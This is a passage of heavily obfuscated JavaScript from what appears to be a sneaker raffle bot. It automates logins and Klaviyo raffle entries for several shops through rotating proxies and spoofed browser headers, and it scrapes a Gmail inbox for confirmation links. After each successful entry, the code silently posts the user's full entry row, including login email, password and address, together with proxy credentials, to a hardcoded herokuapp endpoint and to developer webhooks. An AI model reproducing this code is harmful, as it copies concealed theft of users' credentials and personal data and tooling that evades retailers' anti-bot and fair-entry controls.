                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5b5f41 = await _0x5c6612['newPage']();
                            await _0x5b5f41['authenticate']({
                                'username': '' + _0x17d3cf[0x2],
                                'password': '' + _0x17d3cf[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5b5f41['setRequestInterception'](!![]), _0x5b5f41['on']('request', _0x107d8a => {
                                _0x107d8a['resourceType']() === 'image' || _0x107d8a['resourceType']() === 'font' || _0x107d8a['resourceType']() === 'media' ? _0x107d8a['abort']() : _0x107d8a['continue']();
                            }), await _0x5b5f41['goto']('' + _0x22d84b[_0x4b974d]['Url'], { 'waitUntil': 'networkidle2' }), await _0x4d70b1(0x12c), await _0x5b5f41['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5b5f41['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4d70b1(0x7d0);
                            try {
                                await _0x5b5f41['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x5b5f41['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20Logging\x20in'), await _0x5b5f41['waitForSelector']('#username'), await _0x5b5f41['type']('#username', _0x22d84b[_0x4b974d]['Email']), await _0x5b5f41['waitForSelector']('#password'), await _0x5b5f41['type']('#password', _0x22d84b[_0x4b974d]['Password']), await _0x4d70b1(0x190), await _0x5b5f41['click']('#buttonSubmit'), await _0x5b5f41['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20Getting\x20Product'), await _0x4d70b1(0x1f4), console['log'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x22d84b[_0x4b974d]['Size']);
                            let _0x364aab = _0x22d84b[_0x4b974d]['Size']['replace']('.5', '\x201/2');
                            if (_0x364aab['toUpperCase']() == 'RANDOM') {
                                const _0x240d99 = await _0x5b5f41['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x69a7ce = Math['round'](Math['random']() * (_0x240d99['length'] - 0x1));
                                await _0x240d99[_0x69a7ce]['click']();
                            } else
                                await _0x5b5f41['click']('button[aria-label=\x22' + _0x364aab + '\x22]');
                            await _0x4d70b1(0x1f4);
                            try {
                                await _0x5b5f41['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x4d70b1(0x12c), console['log'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5b5f41['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x4d70b1(0x12c), await _0x5b5f41['type']('#dwfrm_raffle_addressFields_firstName', _0x22d84b[_0x4b974d]['FirstName']), await _0x4d70b1(0x12c), await _0x5b5f41['type']('#dwfrm_raffle_addressFields_lastName', _0x22d84b[_0x4b974d]['LastName']), await _0x4d70b1(0x12c), await _0x5b5f41['select']('#dwfrm_raffle_addressFields_country', _0x22d84b[_0x4b974d]['Country']), await _0x4d70b1(0x12c), await _0x5b5f41['type']('#dwfrm_raffle_addressFields_city', _0x22d84b[_0x4b974d]['City']), await _0x4d70b1(0x12c);
                            _0x22d84b[_0x4b974d]['Postcode'] == undefined && (_0x22d84b[_0x4b974d]['Postcode'] = _0x22d84b[_0x4b974d]['Zip']);
                            await _0x5b5f41['type']('#dwfrm_raffle_addressFields_postalCode', _0x22d84b[_0x4b974d]['Postcode']), await _0x4d70b1(0x12c), await _0x5b5f41['type']('#dwfrm_raffle_addressFields_address1', _0x22d84b[_0x4b974d]['Address1']), await _0x4d70b1(0x12c), await _0x5b5f41['type']('#dwfrm_raffle_addressFields_address2', _0x22d84b[_0x4b974d]['HouseNumber']), await _0x4d70b1(0x12c), await _0x5b5f41['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x22d84b[_0x4b974d]['Address2']), await _0x4d70b1(0x12c), await _0x5b5f41['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x4d70b1(0x12c), await _0x5b5f41['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x22d84b[_0x4b974d]['Follower']), await _0x4d70b1(0x1f4), await _0x5b5f41['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x4d70b1(0x1f4), console['log'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20' + _0x46bace['blue']('Awaiting\x20Paypal\x20Payment')), await _0x5b5f41['click']('.b-paypal_button');
                            try {
                                await _0x5b5f41['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x3d340f = 'no', _0x5155d2(_0x22d84b[_0x4b974d], _0x5be89f), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x306ca1['succesDEVMSG']);
                                await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x306ca1['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x44bee6, _0x306ca1['succesPUBMSG']);
                                let _0x2cd5e1 = _0x22d84b[_0x4b974d];
                                try {
                                    prxdata = {
                                        'username': _0x5e8391['replace']('#', ''),
                                        'module': _0x5be89f['name'],
                                        'entrydata': JSON['stringify'](_0x2cd5e1),
                                        'proxy': '' + _0xa2c0bf[_0x4b974d]
                                    };
                                    var _0x5dfa76 = JSON['stringify'](prxdata);
                                    let _0x18f8ae = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x5dfa76, _0x18f8ae);
                                } catch (_0x553fe9) {
                                }
                            } catch (_0x14c5a9) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x14c5a9)), _0x30f724 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x14c5a9;
                                var _0x25c835 = await _0x39e876(_0x22d84b[_0x4b974d], _0x5be89f, 'dev', !![], _0x30f724);
                                _0x306ca1['errorDEV'] = { 'embeds': [_0x25c835] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x306ca1['errorDEV']), await _0x19fe15(_0x556085, _0x306ca1['errorDEV']);
                            }
                        } catch (_0x17272b) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20' + _0x17272b)), _0x30f724 = '' + _0x17272b;
                            var _0x25c835 = await _0x39e876(_0x22d84b[_0x4b974d], _0x5be89f, 'dev', !![], _0x30f724);
                            _0x306ca1['errorDEV'] = { 'embeds': [_0x25c835] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x306ca1['errorDEV']), await _0x19fe15(_0x556085, _0x306ca1['errorDEV']), _0x3d340f = 'yes';
                        } finally {
                            _0x5c6612 && _0x5c6612['close']();
                            if (_0x3d340f == 'yes' && _0x25d1b4 != 0x5) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20Retrying\x20(' + _0x25d1b4 + '\x20/\x205)')), _0x4b974d = _0x4b974d - 0x1, _0x25d1b4 = _0x25d1b4 + 0x1;
                                continue;
                            }
                            _0x3d340f == 'yes' && _0x25d1b4 >= 0x5 && (_0x5415a4(_0x22d84b[_0x4b974d], _0x5be89f), _0x3d340f = 'no', _0x25d1b4 = 0x0), console['log']('Waiting\x20for\x20' + _0x35ea91['AfewDelay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RLhP3P',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TRdHMm',
                                '$consent_form_version': 0x899638,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x542084, _0x2ea748, _0x311ca9) {
                    for (var _0x5340cf = 0x0; _0x5340cf < _0x2ea748['length']; _0x5340cf++) {
                        try {
                            await _0x408b94(_0x2ea748, _0x5340cf);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x4cc209(_0xb2693, _0x20a697, _0x552437, _0x44dd77, _0x1bb879) {
                            var _0x13c488, _0x2c123a = {}, _0x30e8a = [], _0x3e1be9 = {}, _0x551007 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x3c902e = Math['round'](Math['random']() * (_0x551007['length'] - 0x1));
                            !_0x44dd77 && (_0x44dd77 = {});
                            if (_0x20a697 != 'ver') {
                                _0x1e0e73(_0x552437['name'] + '\x20Task\x20' + (_0xb2693 + 0x1) + '\x20/\x20' + _0x44dd77['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1), await _0x408b94(_0x44dd77, _0xb2693), _0x2c123a = _0x552437['data'], _0x2c123a['data']['attributes']['email'] = '' + _0x44dd77[_0xb2693]['Email'];
                                if (_0x44dd77[_0xb2693]['Size'] == 'RANDOM') {
                                }
                                _0x2c123a['data']['attributes']['properties']['$first_name'] = '' + _0x44dd77[_0xb2693]['FirstName'], _0x2c123a['data']['attributes']['properties']['$last_name'] = '' + _0x44dd77[_0xb2693]['LastName'], _0x2c123a['data']['attributes']['properties']['$address1'] = _0x44dd77[_0xb2693]['Address1'] + '\x20' + _0x44dd77[_0xb2693]['Address2'] + '\x20' + _0x44dd77[_0xb2693]['HouseNumber'], _0x2c123a['data']['attributes']['properties']['$zip'] = '' + _0x44dd77[_0xb2693]['Zip'], _0x2c123a['data']['attributes']['properties']['$city'] = '' + _0x44dd77[_0xb2693]['City'], _0x2c123a['data']['attributes']['properties']['$country'] = '' + _0x44dd77[_0xb2693]['Country'], _0x44dd77[_0xb2693]['Size'] == 'RANDOM' ? _0x2c123a['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x551007[_0x3c902e] : _0x2c123a['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x44dd77[_0xb2693]['Size'], _0x2c123a['data']['attributes']['properties']['$phone_number'] = '' + _0x44dd77[_0xb2693]['Phone'], _0x2c123a['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x44dd77[_0xb2693]['Follower'];
                            }
                            if (_0x35ea91['useRandomProxy'] = ![])
                                var _0x9ade3 = _0x1bb879[_0xb2693]['split'](':');
                            else
                                var _0x338336 = Math['round'](Math['random']() * (_0x1bb879['length'] - 0x1)), _0x9ade3 = _0x1bb879[_0x338336]['split'](':');
                            var _0x151292 = {
                                'jar': _0x3bb051,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x552437['url'],
                                'headers': _0x552437['headers'],
                                'body': JSON['stringify'](_0x2c123a),
                                'proxy': 'http://' + _0x9ade3[0x2] + ':' + _0x9ade3[0x3] + '@' + _0x9ade3[0x0] + ':' + _0x9ade3[0x1]
                            };
                            return _0x20a697 != 'ver' && (_0x151292['url'] = _0x552437['url'], _0x151292['headers'] = _0x552437['headers']), _0x20a697 == 'ver' && (_0x151292['method'] = 'GET'), new Promise(function (_0x33baee, _0x495bc8) {
                                callback = async (_0x1630cb, _0x5af0d4, _0x2571a7) => {
                                    if (!_0x1630cb && _0x5af0d4['statusCode'] == 0xca || !_0x1630cb && _0x5af0d4['statusCode'] == 0xc8) {
                                        if (_0x20a697 != 'ver') {
                                            var _0x2bf265 = await _0x39e876(_0x44dd77[_0xb2693], _0x552437, 'dev', ![]), _0x24c2a9 = await _0x39e876(_0x44dd77[_0xb2693], _0x552437, 'pub', ![]);
                                            const _0x359723 = {
                                                'succesDEVMSG': { 'embeds': [_0x2bf265] },
                                                'succesPUBMSG': { 'embeds': [_0x24c2a9] }
                                            };
                                            let _0x293ebe = _0x44dd77[_0xb2693];
                                            try {
                                                prxdata = {
                                                    'username': _0x5e8391['replace']('#', ''),
                                                    'module': _0x552437['name'],
                                                    'entrydata': JSON['stringify'](_0x293ebe),
                                                    'proxy': '' + _0x1bb879[_0xb2693]
                                                };
                                                var _0x331374 = JSON['stringify'](prxdata);
                                                let _0x48fd53 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x331374, _0x48fd53);
                                            } catch (_0x558441) {
                                            }
                                            if (_0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '')
                                                try {
                                                    await _0x19fe15(_0x35ea91['webhook'], _0x359723['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x359723['succesDEVMSG']), await _0x4d70b1(0xc8);
                                            try {
                                                await _0x19fe15(_0x44bee6, _0x359723['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5155d2(_0x44dd77[_0xb2693], _0x552437);
                                        }
                                        _0x33baee(console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x552437['name'] + ']\x20Task\x20' + (_0xb2693 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x20a697 != 'ver') {
                                            var _0xa0e9c4 = '' + _0x1630cb, _0xf7f5e2 = await _0x39e876(_0x44dd77[_0xb2693], _0x552437, 'dev', !![], _0xa0e9c4), _0x32273d = {};
                                            _0x32273d['errorDEV'] = { 'embeds': [_0xf7f5e2] }, _0x5415a4(_0x44dd77[_0xb2693], _0x552437), _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x32273d['errorDEV']), await _0x19fe15(_0x556085, _0x32273d['errorDEV']);
                                        }
                                        _0x495bc8(console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x552437['name'] + ']\x20Task\x20' + (_0xb2693 + 0x1) + ':\x20' + _0x1630cb)));
                                    }
                                };
                                try {
                                    _0x20a697 != 'ver' && console['log'](_0x446ef5() + '\x20[' + _0x552437['name'] + ']\x20Task\x20' + (_0xb2693 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2c123a['data']['attributes']['email']), _0x2b1433(_0x151292, callback);
                                } catch (_0x32e659) {
                                    console['log'](_0x446ef5() + '\x20Task\x20' + (_0xb2693 + 0x1) + ':\x20' + _0x32e659);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x4cc209(_0x5340cf, 'nor', _0x542084, _0x2ea748, _0x311ca9), console['log'](_0x446ef5() + '\x20[' + _0x542084['name'] + ']\x20Sleeping\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        } catch (_0x417136) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1f59c6, _0x46514f, _0x35cc5e) {
                    var _0x344b2e = [], _0x23c25b = ![];
                    async function _0x1a2060() {
                        var _0x1bbc0b = new _0x54e3bb({
                            'user': _0x35ea91['masterMail'],
                            'password': _0x35ea91['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x355a72(_0x31b65f) {
                            _0x1bbc0b['openBox']('INBOX', ![], _0x31b65f);
                        }
                        _0x1bbc0b['once']('ready', function () {
                            _0x355a72(function (_0x4e9778, _0x512447) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4e9778)
                                    throw _0x4e9778;
                                _0x1bbc0b['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x1b8937, _0x4925f5) {
                                    if (!_0x4925f5 || !_0x4925f5['length'])
                                        console['log'](_0x446ef5() + '\x20[' + _0x1f59c6['name'] + ']\x20No\x20mails\x20found'), _0x1bbc0b['end']();
                                    else {
                                        var _0x14b8b3 = _0x1bbc0b['seq']['fetch'](_0x4925f5, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x14b8b3['on']('message', function (_0x1d2348, _0x21e3fa) {
                                            var _0x5dad3b = '(#' + _0x21e3fa + ')\x20';
                                            _0x1d2348['on']('body', function (_0x212747, _0x5ae53a) {
                                                _0x2fc4a3(_0x212747, (_0x4e1c79, _0x3ac817) => {
                                                    var _0x48e149 = _0x3ac817['text']['split']('(')[0x1], _0x38b10d = _0x48e149['split'](')')[0x0];
                                                    _0x344b2e['push'](_0x38b10d);
                                                });
                                            }), _0x1d2348['once']('end', function () {
                                            });
                                        }), _0x14b8b3['once']('error', function (_0x76b41f) {
                                            console['log']('Fetch\x20error:\x20' + _0x76b41f), _0x23c25b = !![];
                                        }), _0x14b8b3['once']('end', function () {
                                            _0x1bbc0b['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x1bbc0b['once']('error', function (_0x5d7982) {
                            console['log'](_0x46bace['red'](_0x5d7982['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x23c25b = !![];
                        }), _0x1bbc0b['once']('end', async function () {
                            _0x23c25b = !![];
                        }), _0x1bbc0b['connect']();
                    }
                    async function _0x994101(_0x549075, _0x7a4299, _0xe2e92) {
                        for (var _0x28359b = 0x0; _0x28359b < _0x7a4299['length']; _0x28359b++) {
                            async function _0x448d06(_0x14c43a, _0x9f603d, _0x5136c8, _0x1fe3f4, _0x13046e) {
                                var _0x1f7561, _0x349167 = {}, _0x35067a = [], _0x397160 = {}, _0x42e041 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x116966 = Math['round'](Math['random']() * (_0x42e041['length'] - 0x1));
                                _0x1fe3f4[_0x14c43a]['Size'] == 'RANDOM' && (_0x1fe3f4[_0x14c43a]['Size'] = _0x42e041[_0x116966]);
                                !_0x1fe3f4 && (_0x1fe3f4 = {});
                                if (_0x35ea91['useRandomProxy'] = ![])
                                    var _0x2780d5 = _0x13046e[_0x14c43a]['split'](':');
                                else
                                    var _0x34eb41 = Math['round'](Math['random']() * (_0x13046e['length'] - 0x1)), _0x2780d5 = _0x13046e[_0x34eb41]['split'](':');
                                var _0x9e2f3 = {
                                    'jar': _0x3bb051,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5136c8['url'],
                                    'headers': _0x5136c8['headers'],
                                    'body': JSON['stringify'](_0x349167),
                                    'proxy': 'http://' + _0x2780d5[0x2] + ':' + _0x2780d5[0x3] + '@' + _0x2780d5[0x0] + ':' + _0x2780d5[0x1]
                                };
                                return _0x9f603d != 'ver' && (_0x9e2f3['url'] = _0x5136c8['url'], _0x9e2f3['headers'] = _0x5136c8['headers']), _0x9f603d == 'ver' && (_0x9e2f3['method'] = 'GET', _0x9e2f3['url'] = _0x1fe3f4[_0x14c43a]), new Promise(function (_0x34e022, _0x29d1b1) {
                                    callback = async (_0x21c64f, _0x180376, _0xcf4fc2) => {
                                        if (!_0x21c64f && _0x180376['statusCode'] == 0xca || !_0x21c64f && _0x180376['statusCode'] == 0xc8) {
                                            if (_0x9f603d != 'ver') {
                                                var _0x533593 = await _0x39e876(_0x1fe3f4[_0x14c43a], _0x5136c8, 'dev', ![]), _0x5ed13d = await _0x39e876(_0x1fe3f4[_0x14c43a], _0x5136c8, 'pub', ![]);
                                                const _0x3cb018 = {
                                                    'succesDEVMSG': { 'embeds': [_0x533593] },
                                                    'succesPUBMSG': { 'embeds': [_0x5ed13d] }
                                                };
                                                if (_0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '')
                                                    try {
                                                        await _0x19fe15(_0x35ea91['webhook'], _0x3cb018['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x3cb018['succesDEVMSG']), await _0x4d70b1(0xc8);
                                                try {
                                                    await _0x19fe15(_0x44bee6, _0x3cb018['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5155d2(_0x1fe3f4[_0x14c43a], _0x5136c8);
                                            }
                                            _0x34e022(console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x5136c8['name'] + ']\x20Task\x20' + (_0x14c43a + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x9f603d != 'ver') {
                                                var _0x29a44f = '' + _0x21c64f, _0x5e3e4d = await _0x39e876(_0x1fe3f4[_0x14c43a], _0x5136c8, 'dev', !![], _0x29a44f), _0x5185fd = {};
                                                _0x5185fd['errorDEV'] = { 'embeds': [_0x5e3e4d] }, _0x5415a4(_0x1fe3f4[_0x14c43a], _0x5136c8), _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x5185fd['errorDEV']), await _0x19fe15(_0x556085, _0x5185fd['errorDEV']);
                                            }
                                            _0x29d1b1(console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x5136c8['name'] + ']\x20Task\x20' + (_0x14c43a + 0x1) + ':\x20' + _0x21c64f)));
                                        }
                                    };
                                    try {
                                        _0x9f603d != 'ver' ? console['log'](_0x446ef5() + '\x20[' + _0x5136c8['name'] + ']\x20Task\x20' + (_0x14c43a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x349167['data']['attributes']['email']) : console['log'](_0x446ef5() + '\x20[' + _0x5136c8['name'] + ']\x20Task\x20' + (_0x14c43a + 0x1) + ':\x20Fetching\x20Response'), _0x2b1433(_0x9e2f3, callback);
                                    } catch (_0x11700f) {
                                        console['log'](_0x446ef5() + '\x20Task\x20' + (_0x14c43a + 0x1) + ':\x20' + _0x11700f);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x448d06(_0x28359b, 'ver', _0x549075, _0x7a4299, _0xe2e92), console['log'](_0x446ef5() + '\x20[' + _0x549075['name'] + ']\x20Sleeping\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                            } catch (_0x4a8936) {
                            }
                        }
                    }
                    try {
                        _0x1a2060();
                        while (!_0x23c25b) {
                            await _0x4d70b1(0xbb8);
                        }
                        console['log']('Found\x20' + _0x344b2e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4d70b1(0x9c4);
                    }
                    await _0x994101(_0x1f59c6, _0x344b2e, _0x35cc5e);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'X4md8Z',
                            'custom_source': 'DZ4137-106',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WspqGE',
                                '$consent_form_version': 0x89a2a4,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5d732f, _0x157d3e, _0x5113e1) {
                    for (var _0x112e75 = 0x0; _0x112e75 < _0x157d3e['length']; _0x112e75++) {
                        try {
                            await _0x408b94(_0x157d3e, _0x112e75);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x120ded(_0x357ce8, _0x138226, _0x1c5fd5, _0xa9dff2, _0x482561) {
                            var _0x49ee7d, _0xc9baf2 = {}, _0x5ec3d4 = [], _0x2e7727 = {}, _0x34c44f = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x56b178 = Math['round'](Math['random']() * (_0x34c44f['length'] - 0x1));
